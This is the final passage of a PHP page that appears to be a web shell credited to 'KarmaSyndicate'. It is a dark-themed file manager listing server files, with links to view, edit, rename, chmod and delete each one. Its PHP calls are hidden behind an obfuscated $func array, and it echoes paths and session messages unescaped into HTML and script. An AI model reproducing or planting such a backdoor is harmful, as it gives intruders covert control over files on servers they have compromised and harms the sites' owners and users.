                  <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=view" class="text-decoration-none text-light"><i class="fa fa-file-code"></i> <?= $dir ?></a>
                </td>
                <td class="text-light"><?= ($func[25]('mime_content_type') ? $func[24]($dir) : $func[8]($dir)) ?></td>
                <td class="text-light"><?= $func[26]($dir) ?></td>
                <td class="text-light"><?= $func[35]($dir) ?></td>
                <td class="text-light"><?= $func[11]($func[10]('%o', $func[6]($dir)), -4); ?></td>
                <td class="text-light"><?= $func[23]("Y-m-d h:i:s", $func[7]($dir)); ?></td>
                <td>
                  <?php if ($dir != '.' && $dir != '..') : ?>
                  <div class="btn-group">
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-edit"></i></a>
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-edit"></i></a>
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-signature"></i></a>
                    <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')"><i class="fa fa-trash"></i></a>
                  </div>
                  <?php endif; ?>
                </td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </div>
        <div class="text-light">&#169; KarmaSyndicate <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
      </div>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script>
  <script>
  <?php if (isset($_SESSION['message'])) : ?>
        Swal.fire(
          '<?= $_SESSION['status'] ?>',
          '<?= $_SESSION['message'] ?>',
          '<?= $_SESSION['class'] ?>'
        )
  <?php endif; clear(); ?>
    function deleteConfirm(url) {
      event.preventDefault()
      Swal.fire({
          title: 'Are you sure?',
          icon: 'warning',
          showCancelButton: true,
          confirmButtonColor: '#3085d6',
          cancelButtonColor: '#d33',
          confirmButtonText: 'Yes, delete it!'
      }).then((result) => {
          if (result.isConfirmed) {
            window.location.href = url
        }
      })
    }
    function jscopy() {
      var jsCopy = document.getElementById("CopyFromTextArea");
      jsCopy.focus();
      jsCopy.select();
      document.execCommand("copy");
    }
  </script>
</body>
</html>